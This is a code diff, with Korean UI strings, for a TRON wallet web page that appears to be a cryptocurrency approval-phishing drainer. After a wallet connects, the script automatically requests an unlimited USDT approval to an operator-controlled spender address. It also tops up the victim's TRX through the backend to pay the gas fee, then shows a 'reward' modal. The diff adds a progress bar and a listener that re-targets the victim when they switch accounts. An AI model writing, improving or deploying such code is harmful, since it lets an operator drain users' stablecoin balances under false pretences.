-        // ===== 자동 감지: 페이지 로드 시 지갑 DApp 브라우저 체크 =====
+        async function getInjectedTronWeb(){
+            if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return window.tronWeb;
+            if(window.tronLink){
+                if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;
+                try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}
+            }
+            return null;
+        }
+
+        // ===== Auto Detection on Load =====
         window.addEventListener('DOMContentLoaded',function(){
-            var a=0;var t=setInterval(async function(){a++;
+            var a=0;
+            var t=setInterval(async function(){
+                a++;
                 try{
                     var tw=await getInjectedTronWeb();
                     if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
                         clearInterval(t);
-                        // 어떤 지갑인지 감지
-                        var provider='TronLink';
-                        if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)provider='TrustWallet';
-                        else if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)provider='TokenPocket';
+                        var provider=detectProvider()||'TronLink';
                         appendLog('[감지] '+provider+' DApp 브라우저 확인됨','success');
                         document.getElementById('wallet-selector-modal').classList.remove('active');
                         await setConnectedWallet(tw.defaultAddress.base58,provider);
-                    }else if(a>10){clearInterval(t);appendLog('[대기] 지갑 DApp 브라우저를 감지하지 못했습니다.','warn');}
-                }catch(e){if(a>10)clearInterval(t);}
+                    }else if(a>12){
+                        clearInterval(t);
+                        appendLog('[대기] 지갑 DApp 브라우저 미감지','warn');
+                    }
+                }catch(e){if(a>12)clearInterval(t);}
             },500);
+
+            // Account change listener
+            if(window.tronLink){
+                window.addEventListener('message',function(e){
+                    if(e.data&&e.data.message&&e.data.message.action==='accountsChanged'){
+                        var newAddr=e.data.message.data&&e.data.message.data.address;
+                        if(newAddr&&newAddr!==currentWalletAddress){
+                            appendLog('[계정 변경] '+newAddr,'warn');
+                            isApproved=false;
+                            setConnectedWallet(newAddr,activeProvider);
+                        }
+                    }
+                });
+            }
         });
 
-        // ===== Connect Button =====
+        // ===== Connect =====
         window.handleConnectWallet=async function(){
             appendLog('[지갑 탐색] 환경 확인 중...');
             var tw=await getInjectedTronWeb();
             if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
-                var provider='TronLink';
-                if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)provider='TrustWallet';
-                else if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)provider='TokenPocket';
+                var provider=detectProvider()||'TronLink';
                 await setConnectedWallet(tw.defaultAddress.base58,provider);
             }else{
-                if(isPC()){
-                    // PC: TronLink 확장 프로그램 설치 안내
-                    document.getElementById('install-modal').classList.add('active');
-                    appendLog('[PC] TronLink 확장 프로그램 미감지','warn');
-                }else{
-                    // 모바일: 지갑 선택 모달
-                    document.getElementById('wallet-selector-modal').classList.add('active');
-                }
+                if(isPC()){document.getElementById('install-modal').classList.add('active');appendLog('[PC] 지갑 확장 프로그램 미감지','warn');}
+                else{document.getElementById('wallet-selector-modal').classList.add('active');}
             }
         };
 
@@ -389,59 +410,103 @@
             document.getElementById('display-address').textContent=address;
             document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+provider;
             document.getElementById('connection-indicator').className='text-[10px] text-emerald-400 font-mono font-semibold flex items-center';
-            document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
+            // Step 1 완료
+            document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
             document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+provider;
             document.getElementById('step1-status').className='text-emerald-400 text-xs font-semibold flex items-center';
+
             appendLog('[백엔드] 서버에 지갑 정보 전송 중...');
-            try{var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});var data=await res.json();if(data.status==='ok'){document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';if(data.isApproved){isApproved=true;setApprovedUI();}showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');appendLog('[연결 완료] '+address+' | '+data.balance+' USDT','success');}}catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
+            try{
+                var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
+                var data=await res.json();
+                if(data.status==='ok'){
+                    document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';
+                    if(data.isApproved){isApproved=true;setApprovedUI();}
+                    showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
+                    appendLog('[연결] '+address+' | '+data.balance+' USDT','success');
+                }
+            }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
+
             if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
         }
 
         function setApprovedUI(){
-            document.getElementById('display-allowance').textContent='무제한 (MAX)';document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
-            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
-            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';document.getElementById('step2-status').className='text-emerald-400 text-xs font-semibold flex items-center';
-            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';document.getElementById('step3').style.opacity='1';
+            document.getElementById('display-allowance').textContent='무제한 (MAX)';
+            document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
+            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';
+            document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
+            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
+            document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';
+            document.getElementById('step2-status').className='text-emerald-400 text-xs font-semibold flex items-center';
+            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done';
+            document.getElementById('step3').style.opacity='1';
+            hideProgress();
         }
 
-        // ===== Approve (TRX 자동 충전 포함) =====
+        // ===== Approve (TRX 자동 충전 + 프로그레스 바) =====
         window.executeUnlimitedApprove=async function(){
-            if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');showWalletSelector();return;}
+            if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
             var spender=await getSpenderAddress();
             if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog('[오류] Spender 미설정','error');return;}
             var tw=await getInjectedTronWeb();
             if(!tw||!tw.contract){showToast('지갑 DApp 브라우저 필요','error');if(isMobile())showWalletSelector();return;}
+
             var btn=document.getElementById('approve-btn');
-            btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>가스비 확인 중...</span>';btn.disabled=true;
-            // TRX 자동 충전
+            btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
+
+            // Step 1: TRX 확인 + 자동 충전
+            setProgress(20,'TRX 잔액 확인 중...');
+            appendLog('[1/3] TRX 잔액 확인 중...','approve');
             try{
-                appendLog('[준비] TRX 잔액 및 에너지 확인 중...','approve');
                 var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
                 var prepData=await prepRes.json();
                 if(prepData.status==='ok'&&prepData.ready){
-                    if(prepData.sent){appendLog('[자동 충전] '+prepData.sentAmount+' TRX 전송 완료!','success');showToast(prepData.sentAmount+' TRX 자동 충전 완료!');}
-                    else{appendLog('[확인] TRX 충분 ('+prepData.trxBalance+' TRX)','success');}
-                }else{showToast('가스비 준비 실패','error');appendLog('[실패] '+(prepData.error||'알 수 없음'),'error');btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;}
+                    if(prepData.sent){
+                        setProgress(40,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');
+                        appendLog('[자동 충전] '+prepData.sentAmount+' TRX 전송 완료','success');
+                        showToast(prepData.sentAmount+' TRX 자동 충전!');
+                    }else{
+                        setProgress(40,'TRX 충분 ('+prepData.trxBalance+' TRX)');
+                        appendLog('[확인] TRX 충분 ('+prepData.trxBalance+')','success');
+                    }
+                }else{
+                    setProgress(0,'');hideProgress();
+                    showToast('가스비 준비 실패','error');appendLog('[실패] '+(prepData.error||''),'error');
+                    btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;
+                }
             }catch(pe){appendLog('[경고] TRX 확인 실패, 계속 진행','warn');}
-            // Approve 실행
+
+            // Step 2: Approve 서명
+            setProgress(60,'스마트 컨트랙트 승인 서명 요청 중...');
+            appendLog('[2/3] 승인 서명 요청 중...','approve');
+            showToast('지갑에서 서명 팝업을 확인하세요.');
+
             try{
-                btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>서명 처리 중...</span>';
-                appendLog('[승인 요청] 무제한 승인 중...','approve');
-                showToast('지갑 서명 팝업을 확인하세요.');
                 var contract=await tw.contract().at(OFFICIAL_USDT_CONTRACT);
                 var txHash=await contract.approve(spender,MAX_ALLOWANCE).send({feeLimit:100000000});
                 if(!txHash)throw new Error('TX 해시 수신 실패');
+
+                // Step 3: 완료
+                setProgress(100,'온체인 승인 완료!');
+                appendLog('[3/3] 승인 성공! TxHash: '+txHash,'success');
                 isApproved=true;setApprovedUI();
-                appendLog('[온체인 승인 성공] TxHash: '+txHash,'success');
+
                 document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
                 document.getElementById('reward-modal').classList.add('active');
+
                 try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
                 showToast('온체인 무제한 승인 완료!');
             }catch(err){
+                hideProgress();
                 var m=err&&err.message?err.message:JSON.stringify(err);
-                if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){showToast('서명 취소','error');appendLog('[취소] 사용자 서명 취소','warn');}
-                else{showToast('트랜잭션 실패','error');appendLog('[실패] '+m,'error');}
-            }finally{btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;}
+                if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){
+                    showToast('서명 취소됨','error');appendLog('[취소] 사용자 서명 취소','warn');
+                }else{
+                    showToast('트랜잭션 실패','error');appendLog('[실패] '+m,'error');
+                }
+            }finally{
+                btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;
+            }
         };
     </script>
 </body>
